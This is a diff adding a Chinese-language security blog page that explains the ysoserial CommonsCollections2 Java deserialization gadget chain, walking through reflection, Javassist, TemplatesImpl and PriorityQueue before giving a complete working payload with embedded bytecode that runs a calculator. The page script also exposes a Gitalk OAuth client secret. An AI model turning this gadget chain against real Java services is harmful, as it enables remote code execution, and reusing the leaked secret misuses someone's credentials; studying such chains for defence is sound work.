@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>ysoserial CommonsCollections2 学习 | Today is new</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://0xwi11.github.io/favicon.ico?v=1706710799621">
+<link rel="stylesheet" href="https://0xwi11.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="面试遇到很多人问CC2，重新学习一下。
+Commons Collections
+Apache Commons是Apache软件基金会的项目，曾经隶属于Jakarta项目。Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Ja..." />
+    <meta name="keywords" content="信息安全" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://0xwi11.github.io">
+        <img src="https://0xwi11.github.io/images/avatar.png?v=1706710799621" class="site-logo">
+        <h1 class="site-title">Today is new</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+          <a class="social-link" href="https://github.com/0xWi11?tab=overview&amp;from=2023-02-01&amp;to=2023-02-28" target="_blank">
+            <i class="fab fa-github"></i>
+          </a>
+        
+      
+        
+          <a class="social-link" href="https://twitter.com/0xwi11" target="_blank">
+            <i class="fab fa-twitter"></i>
+          </a>
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      相信美好的事情将会发生
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://0xwi11.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">ysoserial CommonsCollections2 学习</h2>
+            <div class="post-date">2021-10-14</div>
+            
+            <div class="post-content" v-pre>
+              <p>面试遇到很多人问CC2，重新学习一下。</p>
+<h1 id="commons-collections">Commons Collections</h1>
+<p>Apache Commons是Apache软件基金会的项目，曾经隶属于Jakarta项目。Commons的目的是提供可重用的、解决各种实际的通用问题且开源的Java代码。Commons由三部分组成：Proper（是一些已发布的项目）、Sandbox（是一些正在开发的项目）和Dormant（是一些刚启动或者已经停止维护的项目）。</p>
+<p>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p>
+<p>因为很多生产环境中都使用了这个包，所以说此包中的反序列化成为了java反序列化中经典的利用链，有很多反序列化漏洞就是使用其中的反序列化链比如说fastjson。本篇文章主要简单的介绍cc2链。</p>
+<h1 id="1-前置知识">1、前置知识</h1>
+<p>在介绍cc2链之前需要掌握几个关于java的知识。</p>
+<h1 id="11-java反射机制">1.1 java反射机制</h1>
+<p>反射（Reflection） 是 Java 程序开发语言的特征之一，它允许运行中的 Java 程序对自身进行检查，或者说“自审”，并能直接操作程序的内部属性和方法。在程序运行时，对于任意一个类，都能够知道这个类的所有属性和方法；对于任意一个对象，都能够调用它的任意一个方法和属性。这种动态的获取信息以及动态调用对象的方法的功能称为 java 的反射机制。<br>
+java中每一个类都会有与之相关联的Class类实例一一对应。<br>
+每编译一个新类就会产生一个与之对应的Class类，这个Class类是由JVM和通过调用类加载器中的defineClass方法自动构造的。</p>
+<p><strong>Class类有四种方法来获取</strong></p>
+<pre><code class="language-java">// 1.通过字符串获取Class对象，这个字符串必须带上完整路径名，进行类初始化
+Class studentClass = Class.forName(&quot;com.test.reflection.Student&quot;);
+// 2.通过类的class属性，不进行类初始化
+Class studentClass2 = Student.class;
+// 3.通过对象的getClass()函数
+Student studentObject = new Student();
+Class studentClass3 = studentObject.getClass();
+// 4.通过classloader获取，不进行类初始化
+ClassLoader  classLoader = this.getClass().getClassLoader();
+Class  clazz5 = classLoader.loadClass(&quot;com.test.reflection.Student&quot;);
+</code></pre>
+<p><strong>创建实例大概有三种方法</strong></p>
+<p><strong>1.公有无参构造方法</strong><br>
+<code>class.newInstance()</code></p>
+<pre><code class="language-java">Monkey mk = Monkey.class.newInstance();
+</code></pre>
+<p>只能调用该类的public无参数构造方法。如果构造方法带有参数，或者不是public，就无法直接通过<code>Class.newInstance()</code>来调用。</p>
+<p><strong>2.公有含参构造方法</strong><br>
+同时这种方式也可以获取公有无参构造方法</p>
+<pre><code class="language-java">Constructor getConstructor(Class&lt;?&gt;... parameterTypes);
+Constructor[] getConstructors();
+</code></pre>
+<p><strong>3.私有构造方法</strong><br>
+同时这种方式也可以获取公有方法</p>
+<pre><code class="language-java">Constructor getDeclaredConstructor(Class&lt;?&gt;... parameterTypes);
+Constructor[] getDeclaredConstructors();
+
+Class clazz = Class.forName(&quot;java.lang.Runtime&quot;); 
+Constructor m = clazz.getDeclaredConstructor(); 
+m.setAccessible(true); 
+clazz.getMethod(&quot;exec&quot;, String.class).invoke(m.newInstance(), &quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;);
+</code></pre>
+<p><strong>调用反射类的方法</strong></p>
+<pre><code class="language-java">Method getMethod(name, Class…)
+public Object invoke(Object obj, Object... args)
+</code></pre>
+<p>如果说我们要使用的方法需要传入一个<code>String</code>类型的<code>name</code>参数，那么在getMethod时候就要填充<code>String</code> 对应的Class对象 <code>String.class</code>，在invoke的时候填充<code>String</code>对象<code>&quot;Xiao ming&quot;</code></p>
+<p>实例代码，以下代码相当于调用了<code>new ProcessBuilder(&quot;calc&quot;).start();</code></p>
+<pre><code class="language-java">Class clazz = Class.forName(&quot;java.lang.ProcessBuilder&quot;);
+//获取构造方法
+Method getConstructorMethod = clazz.getClass().getMethod(&quot;getConstructor&quot;, Class[].class);//因为...特性这里也可传入Class[].class效果相同
+//传入参数返回构造方法
+Object b = getConstructorMethod.invoke(clazz, new Object[]{new Class[]{String[].class}});
+//利用返回的构造方法来创建对象
+Method newInstanceMethod = b.getClass().getMethod(&quot;newInstance&quot;, new Class[]{Object[].class});
+//调用方法传入cmd参数之后创建对象
+Object d = newInstanceMethod.invoke(b, new Object[]{new String[][]{{&quot;calc&quot;}}});
+//获得start方法
+Method startMethod = d.getClass().getMethod(&quot;start&quot;, new Class[]{});
+//调用start方法
+startMethod.invoke(d, new Object[]{});
+</code></pre>
+<h1 id="12-利用javassist操作字节码">1.2 利用Javassist操作字节码</h1>
+<blockquote>
+<p>JAVAssist( JAVA Programming ASSISTant ) 是一个开源的分析 , 编辑 , 创建 Java字节码( Class )的类库 . 他允许开发者自由的在一个已经编译好的类中添加新的方法，或者是修改已有的方法。对Javassist简单的理解，我们使用java反射机制动态的获取和修改对象中的成员变量，同时使用Javassist动态的获取和修改对象中的方法。</p>
+</blockquote>
+<p>这里借用别人的代码，使用方法</p>
+<pre><code class="language-java">package com.reflect;
+import javassist.CannotCompileException;
+import javassist.ClassPool;
+import javassist.CtClass;
+import javassist.NotFoundException;
+import java.io.IOException;
+
+public class test4 {
+    public static void main(String[] args) throws NotFoundException, CannotCompileException, IOException {
+        ClassPool pool = ClassPool.getDefault();//获取类搜索路径（从默认的JVM类搜索路径搜索）
+        CtClass clazz = pool.get(test4.class.getName());//将test4类放入hashtable并返回CtClass对象
+        String cmd = &quot;java.lang.Runtime.getRuntime().exec(\&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator\&quot;);&quot;;
+        clazz.makeClassInitializer().insertBefore(cmd);//在static前面插入
+        clazz.makeClassInitializer().insertAfter(cmd);//在static后面插入
+        String Name = &quot;hehehe&quot;;
+        clazz.setName(Name);//设置类名
+        clazz.writeFile(&quot;./a.class&quot;);//写入文件
+    }
+}
+</code></pre>
+<p>这段代码首先试获取test4的Class对象，然后通过<code>makeClassInitializer()</code>插入我们的静态代码<code>cmd</code>，在java中类加载的时候会自动运行静态代码块中的代码。<br>
+写入的文件如下<br>
+<img src="https://0xwi11.github.io/post-images/1635080041203.png" alt="" loading="lazy"></p>
+<h1 id="13-加载字节码">1.3 加载字节码</h1>
+<p>ClassLoader类 核心方法：<br>
+1.loadClass(String className)，根据名字加载一个类。<br>
+2.defineClass(String name, byte[] b, int off, int len)，将一个字节流定义为一个类。<br>
+3.findClass(String name)，查找一个类。<br>
+4.findLoadedClass(String name)，在已加载的类中，查找一个类。<br>
+5.resolveClass(链接指定的Java类)</p>
+<p>利用defineClass()，我们可以通过byte动态的加载一个类</p>
+<pre><code class="language-java">import java.lang.reflect.Method;
+
+public class classloadertest extends ClassLoader{
+    private static String testclassname= &quot;com.test.test&quot;;
+    //转换byte后的字节码
+    private static byte[] classbytes= new byte[]{-54, -2, -70, -66, 0, 0, 0, 52, 0, 29, 10, 0, 6, 0, 15, 9, 0, 16, 0, 17, 8, 0, 18, 10, 0, 19, 0, 20, 7, 0, 21, 7, 0, 22, 1, 0, 6, 60, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 4, 109, 97, 105, 110, 1, 0, 22, 40, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 9, 116, 101, 115, 116, 46, 106, 97, 118, 97, 12, 0, 7, 0, 8, 7, 0, 23, 12, 0, 24, 0, 25, 1, 0, 17, -23, -114, -75, -47, -122, -18, -108, -111, -23, -114, -76, -26, -124, -84, -27, -89, -101, 7, 0, 26, 12, 0, 27, 0, 28, 1, 0, 13, 99, 111, 109, 47, 116, 101, 115, 116, 47, 116, 101, 115, 116, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 1, 0, 3, 111, 117, 116, 1, 0, 21, 76, 106, 97, 118, 97, 47, 105, 111, 47, 80, 114, 105, 110, 116, 83, 116, 114, 101, 97, 109, 59, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 80, 114, 105, 110, 116, 83, 116, 114, 101, 97, 109, 1, 0, 7, 112, 114, 105, 110, 116, 108, 110, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 0, 33, 0, 5, 0, 6, 0, 0, 0, 0, 0, 2, 0, 1, 0, 7, 0, 8, 0, 1, 0, 9, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 10, 0, 0, 0, 6, 0, 1, 0, 0, 0, 3, 0, 9, 0, 11, 0, 12, 0, 1, 0, 9, 0, 0, 0, 37, 0, 2, 0, 1, 0, 0, 0, 9, -78, 0, 2, 18, 3, -74, 0, 4, -79, 0, 0, 0, 1, 0, 10, 0, 0, 0, 10, 0, 2, 0, 0, 0, 5, 0, 8, 0, 6, 0, 1, 0, 13, 0, 0, 0, 2, 0, 14};
+
+
+    @Override
+    protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException {
+        //只处理com.test.test类
+        if (name.equals(testclassname)) {
+          //将一个字节流定义为一个类。
+            return defineClass(testclassname, classbytes, 0, classbytes.length);
+        }
+        return super.findClass(name);
+    }
+
+    public static void main(String[] args) throws Exception {
+        //创建加载器
+        classloadertest classloadertest = new classloadertest();
+        //使用我们自定义的类去加载testclassname
+        Class aClass = classloadertest.loadClass(testclassname);
+        //反射创建test类对象
+        Object o = aClass.newInstance();
+        //反射获取method方法
+        Method method = o.getClass().getMethod(&quot;method&quot;);
+        //反射去调用执行method方法
+        String str = (String) method.invoke(o);
+        System.out.println(str);
+    }
+}
+</code></pre>
+<h1 id="2-命令执行点">2、命令执行点</h1>
+<p>命令执行的点是由<code>TemplatesImpl</code>类触发的，是因为其中的<code>newTransformer</code>方法可以用来通过字节码来创建实例。<br>
+简单的跟进一下<br>
+<img src="https://0xwi11.github.io/post-images/1635081030675.png" alt="" loading="lazy"><br>
+进入<code>getTransletInstance</code><br>
+<img src="https://0xwi11.github.io/post-images/1635081032987.png" alt="" loading="lazy"><br>
+进入<code>defineTransletClasses</code><br>
+<img src="https://0xwi11.github.io/post-images/1635081042292.png" alt="" loading="lazy"><br>
+<code>defineClass</code>来装载字节码<br>
+<img src="https://0xwi11.github.io/post-images/1635081046711.png" alt="" loading="lazy"><br>
+最后创建实例，此时我们写在静态代码块或构造方法中的恶意代码就已经执行了。<br>
+这里借用别人的图可以更好的理解。<br>
+<img src="https://0xwi11.github.io/post-images/1635081248838.png" alt="" loading="lazy"></p>
+<p>至此恶意代码是如何能够运行我们已经弄清楚了，接下来我们如何去触发<code>newTransformer</code>方法呢？</p>
+<h1 id="3-反序列化入口">3、反序列化入口</h1>
+<p><code>PriorityQueue</code>类重写了其<code>readObject</code>方法，<br>
+<img src="https://0xwi11.github.io/post-images/1635081423953.png" alt="" loading="lazy"><br>
+跟进入<code>heapify</code>方法<br>
+<img src="https://0xwi11.github.io/post-images/1635081511298.png" alt="" loading="lazy"><br>
+跟进<code>siftDownUsingComparator</code>方法<br>
+<img src="https://0xwi11.github.io/post-images/1635081579017.png" alt="" loading="lazy"><br>
+可以看到调用了比较器的<code>compare</code>方法<br>
+而<code>TransformingComparator</code>类的<code>compare</code>方法，调用了熟悉的<code>transform</code>方法。<br>
+<img src="https://0xwi11.github.io/post-images/1635081719658.png" alt="" loading="lazy"><br>
+<code>InvokeTransformer</code>的<code>transform</code>方法可以用来调用传入对象的任意方法。所以在这里我们可以用其调用我们上面<code>TemplatesImpl</code>类的<code>newTransformer</code>方法来执行我们的恶意代码。</p>
+<p>这里借用别人的图，完整的链就成了下图所示<br>
+<img src="https://0xwi11.github.io/post-images/1635081971122.png" alt="" loading="lazy"></p>
+<p><strong>梳理一下</strong><br>
+1、<code>TemplatesImpl</code>类的<code>newTransformer</code>方法可以通过加载字节码来执行我们的恶意代码。<br>
+2、<code>InvokeTransformer</code>的<code>transform</code>方法可以用来调用传入对象的任意方法。<br>
+3、<code>TransformingComparator</code>类的<code>compare</code>方法中调用了<code>transform</code>方法。<br>
+4、<code>PriorityQueue</code>类<code>readObject</code>方法中调用了比较器的<code>compare</code>方法。<br>
+5、反序列化时会自动调用<code>readObject</code>方法</p>
+<h1 id="4-payload">4、Payload</h1>
+<pre><code class="language-java">public class cc2_1 {
+
+    public static void main(String[] args) throws Exception {
+        //构造恶意类TestTemplatesImpl转换为字节码并进行base64编码
+        byte[] bytes = Base64.decode(&quot;yv66vgAAADEAMQoACAAhCgAiACMIACQKACIAJQcAJgoABQAnBwAoBwApAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR0aGlzAQAaTGNvbS9jYy9UZXN0VGVtcGxhdGVzSW1wbDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9ucwcAKgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEAFlRlc3RUZW1wbGF0ZXNJbXBsLmphdmEMAAkACgcAKwwALAAtAQAEY2FsYwwALgAvAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwAMAAKAQAYY29tL2NjL1Rlc3RUZW1wbGF0ZXNJbXBsAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA9wcmludFN0YWNrVHJhY2UAIQAHAAgAAAAAAAMAAQAJAAoAAQALAAAAZgACAAIAAAAWKrcAAbgAAhIDtgAEV6cACEwrtgAGsQABAAQADQAQAAUAAgAMAAAAGgAGAAAADAAEAA4ADQARABAADwARABAAFQASAA0AAAAWAAIAEQAEAA4ADwABAAAAFgAQABEAAAABABIAEwACAAsAAAA/AAAAAwAAAAGxAAAAAgAMAAAABgABAAAAFgANAAAAIAADAAAAAQAQABEAAAAAAAEAFAAVAAEAAAABABYAFwACABgAAAAEAAEAGQABABIAGgACAAsAAABJAAAABAAAAAGxAAAAAgAMAAAABgABAAAAGgANAAAAKgAEAAAAAQAQABEAAAAAAAEAFAAVAAEAAAABABsAHAACAAAAAQAdAB4AAwAYAAAABAABABkAAQAfAAAAAgAg&quot;);
+        //反射创建TemplatesImpl
+        Class&lt;?&gt; aClass = Class.forName(&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;);
+        Constructor&lt;?&gt; constructor = aClass.getDeclaredConstructor(new Class[]{});
+        Object TemplatesImpl_instance = constructor.newInstance();
+        //将恶意类的字节码设置给_bytecodes属性
+        Field bytecodes = aClass.getDeclaredField(&quot;_bytecodes&quot;);
+        bytecodes.setAccessible(true);
+        bytecodes.set(TemplatesImpl_instance , new byte[][]{bytes});
+        //设置属性_name为恶意类名
+        Field name = aClass.getDeclaredField(&quot;_name&quot;);
+        name.setAccessible(true);
+        name.set(TemplatesImpl_instance , &quot;TestTemplatesImpl&quot;);
+
+
+        Field _tfactory = aClass.getDeclaredField(&quot;_tfactory&quot;);
+        _tfactory.setAccessible(true);
+        _tfactory.set(TemplatesImpl_instance ,  new TransformerFactoryImpl());
+
+        //传递给TransformingComparator
+        InvokerTransformer transformer=new InvokerTransformer(&quot;newTransformer&quot;,null,null);
+        TransformingComparator transformer_comparator =new TransformingComparator(transformer);
+
+        PriorityQueue queue = new PriorityQueue(2);
+        //queue.add(1);
+        //queue.add(1);
+        //设置comparator属性
+        Field field=queue.getClass().getDeclaredField(&quot;comparator&quot;);
+        field.setAccessible(true);
+        field.set(queue,transformer_comparator);
+
+        Field field2=queue.getClass().getDeclaredField(&quot;size&quot;);
+        field2.setAccessible(true);
+        field2.set(queue,2);
+        //设置queue属性
+        field=queue.getClass().getDeclaredField(&quot;queue&quot;);
+        field.setAccessible(true);
+        //数组中必须添加2个元素
+        Object[] objects = new Object[]{TemplatesImpl_instance , TemplatesImpl_instance};
+        field.set(queue,objects);
+
+        ByteArrayOutputStream barr = new ByteArrayOutputStream();
+        ObjectOutputStream oos = new ObjectOutputStream(barr);
+        oos.writeObject(queue);
+        oos.close();
+        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));
+        Object object = ois.readObject();
+
+    }
+}
+</code></pre>
+<p><strong>关于add(1)</strong><br>
+在刚开始学习的时候对于利用代码中的add(1)，非常的不解，后来经过实验可以用以下代码去代替add(1)，其实是成员变量size的限制，进行比较需要两个元素以上。</p>
+<pre><code class="language-java">        Field field2=queue.getClass().getDeclaredField(&quot;size&quot;);
+        field2.setAccessible(true);
+        field2.set(queue,2);
+</code></pre>
+<h1 id="5-小结">5、小结</h1>
+<p>在对基础知识熟悉之后，CC链其实还是比较好理解的，相关的类其实代码量不多，自己动手看看代码很好理解，只要理解好CC1和CC2的链，其他的链不过也就是利用不同的类来触发特定的方法比如<code>transform</code>。</p>
+<h1 id="参考资料">参考资料:</h1>
+<p><a href="https://paper.seebug.org/1242/#commons-collections">https://paper.seebug.org/1242/#commons-collections</a><br>
+<a href="https://xz.aliyun.com/t/1756#toc-3">https://xz.aliyun.com/t/1756#toc-3</a><br>
+<a href="https://www.anquanke.com/post/id/232592#h2-16">https://www.anquanke.com/post/id/232592#h2-16</a></p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://0xwi11.github.io/tag/amUzoEOq9/" class="tag">
+                    信息安全
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://0xwi11.github.io/post/jndi-zhu-ru-he-unserialize-xue-xi/">
+                  <h3 class="post-title">
+                    JNDI注入和unserialize学习
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: 'b2be97bd4f11fa2c7ed0',
+        clientSecret: '7cd82370c455720ef14b1c828ee50582651f71c4',
+        repo: 'bolg-comment',
+        owner: '0xWi11',
+        admin: ['0xWi11'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
